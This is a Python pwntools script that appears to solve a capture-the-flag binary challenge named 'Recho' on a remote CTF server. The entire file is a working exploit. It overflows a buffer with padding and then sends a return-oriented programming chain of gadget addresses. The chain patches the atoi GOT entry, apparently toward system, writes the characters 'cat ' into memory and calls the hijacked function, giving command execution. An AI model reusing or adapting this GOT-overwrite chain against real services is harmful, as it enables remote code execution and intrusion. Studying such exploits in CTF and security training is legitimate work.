from pwn import *
context.log_level = 'debug'

t = remote('recho.2017.teamrois.cn', 9527)
#t = process('./Recho')

t.recvline()

t.sendline('1000')
payload = ''
payload += p64(0x00000000004008a3)+p64(0x0000000000601040)    # pop rdi; ret;   rdi = 0x601040; atoi
payload += p64(0x00000000004006fc)+p64(0x10) + p64(0x40070d)  # pop rax; ret;   rax = 0x10; add [rdi], al; ret;

payload += p64(0x00000000004008a3)+p64(0x0000000000601041)    # pop rdi; ret;   rdi = 0x601041;
payload += p64(0x00000000004006fc)+p64(229) + p64(0x40070d)   # pop rax; ret;   rax=0xe5;   add [rdi], al; ret;

payload += p64(0x00000000004008a3)+p64(0x0000000000601042)    # pop rdi; ret;   rdi = 0x601042
payload += p64(0x00000000004006fc)+p64(1) + p64(0x40070d)     # pop rax; ret;   rax=1;      add [rdi], al; ret;



payload += p64(0x00000000004008a3)+p64(0x0000000000601054)    # pop rdi; ret;   rdi = 0x601054;
payload += p64(0x00000000004006fc)+p64(99) + p64(0x40070d)    # pop rax; ret;   rax = 99; 'c'   add [rdi], al; ret;

payload += p64(0x00000000004008a3)+p64(0x0000000000601055)    # pop rdi; ret;   rdi = 0x601055;
payload += p64(0x00000000004006fc)+p64(97) + p64(0x40070d)    # pop rax; ret;   rax = 97; 'a'   add [rdi], al; ret;

payload += p64(0x00000000004008a3)+p64(0x0000000000601056)    # pop rdi; ret;   rdi = 0x601056;
payload += p64(0x00000000004006fc)+p64(116) + p64(0x40070d)   # pop rax; ret;   rax = 116; 't'   add [rdi], al; ret;

payload += p64(0x00000000004008a3)+p64(0x0000000000601057)    # pop rdi; ret;   rdi = 0x601057;
payload += p64(0x00000000004006fc)+p64(32) + p64(0x40070d)    # pop rax; ret;   rax = 32; ' '   add [rdi], al; ret;


payload += p64(0x00000000004008a3) + p64(0x0000000000601054)  # pop rdi; ret;   rdi = 0x601054;

payload += p64(0x0000000000400620)                            # call atoi
t.sendline('a'*0x38+payload)

t.sock.shutdown(socket.SHUT_WR)

t.interactive()


